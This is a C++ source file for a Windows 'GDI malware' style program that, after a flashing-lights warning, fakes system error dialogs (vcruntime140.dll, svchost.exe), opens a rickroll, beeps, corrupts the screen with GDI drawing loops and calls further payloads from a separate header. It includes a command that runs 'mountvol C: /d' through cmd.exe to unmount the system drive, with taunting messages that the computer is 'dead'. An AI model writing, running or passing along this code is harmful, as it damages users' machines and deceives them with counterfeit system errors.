#ifdef UNICODE
#undef UNICODE
#define MULTIBYTE
#endif

#include "include.h"
#include "payloads.h"

typedef int (*functionarray)();

DWORD WINAPI audio(LPVOID lpParam) {
    while (true) {
        Sleep(rand() % 10000);
        Beep(rand() % 2000, rand() % 5000);
    }
    ExitThread(0);
}

INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, INT nCmdShow) {
    if (MessageBoxW(NULL, L"This program contains rapid flashing lights and audio.\n\nDo you wish to continue?",
                    L"Warning", MB_YESNO | MB_ICONWARNING) == IDNO) {
        ExitProcess(0);
    }

    functionarray payloads[] = {
        rickroll,
        p1,
        p2,
        p3,
        p4,
        p5,
        p6,
        p7,
        p8,
        p9,
        p10,
        p11
    }; // use: payloads[x]() for function px(). why use this? functions in random order, im still working on porting all payloads to payloads.h

    DWORD zero = 0;

    MSGBOXPARAMS msglol = { 0 };
    msglol.cbSize = sizeof(MSGBOXPARAMS);
    msglol.hwndOwner = NULL;
    msglol.hInstance = GetModuleHandle(NULL);
    msglol.lpszText = "Cannot find vcruntime140.dll. Click OK to terminate the program. This error has been reported.";
    msglol.lpszCaption = "Fatal error in Xytharis.exe";
    msglol.dwStyle = MB_OK | MB_ICONHAND;
    HANDLE hmsg1 = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msglol, NULL, NULL);

    //rick roll
    ShellExecuteA(NULL, "open", "https://www.youtube.com/watch?v=dQw4w9WgXcQ", NULL, NULL, SW_HIDE);

    HANDLE hAudio = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)audio, NULL, 0, NULL);

    HANDLE hVolume = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)payloads[7], NULL, 0, NULL);

    ShellExecuteA(NULL, "open" "C:\\Windows\\System32\\cmd.exe", "mountvol C: /d", NULL, NULL, SW_HIDE);
    ShellExecuteA(NULL, "open" "C:\\Windows\\sysnative\\cmd.exe", "mountvol C: /d", NULL, NULL, SW_HIDE);

    Sleep(5000);

    MSGBOXPARAMS msg2 = { 0 };
    msg2.cbSize = sizeof(MSGBOXPARAMS);
    msg2.hwndOwner = NULL;
    msg2.hInstance = GetModuleHandle(NULL);
    msg2.lpszText = "Your computer is now dead! MUAHAHHAHAHHAAHHAHAHAHHAHHA";
    msg2.lpszCaption = "Your computer is mine now";
    msg2.dwStyle = MB_OK | MB_ICONHAND;
    HANDLE hmsg2 = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msg2, NULL, NULL);

    MSGBOXPARAMS msg1 = { 0 };
    msg1.cbSize = sizeof(MSGBOXPARAMS);
    msg1.hwndOwner = NULL;
    msg1.hInstance = GetModuleHandle(NULL);
    msg1.lpszText = "Error in application \"svchost.exe\": terminating...";
    msg1.lpszCaption = "Error";
    msg1.dwStyle = MB_YESNO | MB_ICONQUESTION;
    HANDLE hmsg3 = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msg1, NULL, NULL);

    payloads[2]();

    HWND desktop = GetDesktopWindow();
    RECT rect;
    GetWindowRect(desktop, &rect);
    INT w = rect.right - rect.left;
    INT h = rect.bottom - rect.top;
    HDC desk = GetDC(NULL);
    PatBlt(desk, rand() % 100, rand() % 100, w, h, DSTINVERT);

    INT sw = GetSystemMetrics(SM_CXSCREEN);
    INT sh = GetSystemMetrics(SM_CYSCREEN);
    SelectObject(desk, CreateSolidBrush(RGB(rand() % 123, rand() % 431, rand() % 311)));

    fori(100) {
        BitBlt(desk, rand() % 21 - 10, rand() % 21 - 10, sw, sh, desk, 0, 0, 0x9273ecef);
        BitBlt(desk, rand() % 21 - 10, rand() % 21 - 10, sw, sh, desk, 0, 0, PATINVERT);
    }
    
    // SetPixel is slow
    //random pixels all over the place
    fori(100) {
        CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
        fori(20) {
            SetPixel(desk, rand() % w, rand() % h, RGB(rand() % 255, rand() % 255, rand() % 255));
        }
        TextOutA(desk, rand() % w, rand() % h, "HAHAHAH UR SCREWED", 18);
        Rectangle(desk, rand() % w, rand() % h, rand() % w, rand() % h);
        Sleep(50);
    }

    MSGBOXPARAMS msg5 = { 0 };
    msg5.cbSize = sizeof(MSGBOXPARAMS);
    msg5.hwndOwner = NULL;
    msg5.hInstance = GetModuleHandle(NULL);
    msg5.lpszText = "that was only round 1, have a little braek"; //typo intentional
    msg5.lpszCaption = "get ready";
    msg5.dwStyle = MB_YESNO | MB_ICONQUESTION;
    HANDLE hmsg4 = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msg5, 0, &zero);

    Ellipse(desk, rand() % w, rand() % h, rand() % w, rand() % h);
    
    Sleep(10000);
    payloads[3]();
    Ellipse(desk, rand() % w, rand() % h, rand() % w, rand() % h);
    
    fori(50) {
        INT y = rand() % sh, h = sh - rand() % sh - (sh / 1 - 8);
        HBRUSH brush = CreateSolidBrush(RGB(rand() % 75, rand() % 75, rand() % 75));
        SelectObject(desk, brush);
        BitBlt(desk, 0, y, float(w / 2) + i, h, desk, rand() % 96 - 56, y, SRCCOPY);
        PatBlt(desk, -1, y, float(w/2) + i, h, PATINVERT);
        Sleep(rand() % 1234);
    }

    HRGN hRegion = CreateRectRgn(0, 0, w, h);

    fori(50) {
        LineTo(desk, rand() % w, rand() % h);
        SetPixel(desk, rand() % w, rand() % h, RGB(rand() % 255, rand() % 255, rand() % 255));
        if (i % 5 == 0) {
            InvertRgn(desk, hRegion);
        }
        Sleep(50);
    }

    fori(1000) {
        i += 5;
        BitBlt(desk, sin(i) * 5, cos(i) * i, sw, h, desk, rand() % i * 50, rand() % i * 50, SRCCOPY);
    } 

    fori(50) {
        BitBlt(desk, i + 5, i - 5, sw, h, desk, rand() % 1920, rand() % 1080, 0x000D0B25);
        PatBlt(desk, i + 5, i - 5, rand() % 1920, rand() % 1080, PATINVERT);
        Sleep(100);
    }

    fori(50) {
        BitBlt(desk, i, i, sw, h, desk, rand() % 694, rand() % 114, SRCERASE);
        Sleep(50);
    }

    CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)payloads[10], NULL, NULL, NULL);

    CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)payloads[11], NULL, NULL, NULL);


    CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)payloads[4], NULL, NULL, NULL);

    HANDLE hHDC = CreateCompatibleDC(desk);

    fori(360) {
        HBRUSH bruh = CreateSolidBrush(RGB(69, 72, 96));
        BitBlt(desk, 0, sin(i), sw, h, desk, 0, 0, SRCCOPY);
        PatBlt(desk, 0, 0, sw, h, PATINVERT);
        Sleep(50);
    }

    payloads[5]();

    //Corrupting the desktop
    fori(100) {
        BitBlt(desk, rand() % w, rand() % h, rand() % w, rand() % h, desk, rand() % w, rand() % h, SRCERASE);
        Sleep(50);
    }
    
    payloads[6]();

    payloads[8]();

    payloads[9]();

    ReleaseDC(NULL, desk);
    CloseHandle(hHDC);
    CloseHandle(hmsg1);
    CloseHandle(hmsg2);
    CloseHandle(hmsg3);
    CloseHandle(hmsg4);

    TerminateThread(hVolume, 1);
    CloseHandle(hVolume);
    TerminateThread(hAudio, 1); //literally not safe
    CloseHandle(hAudio);

    return 0;
}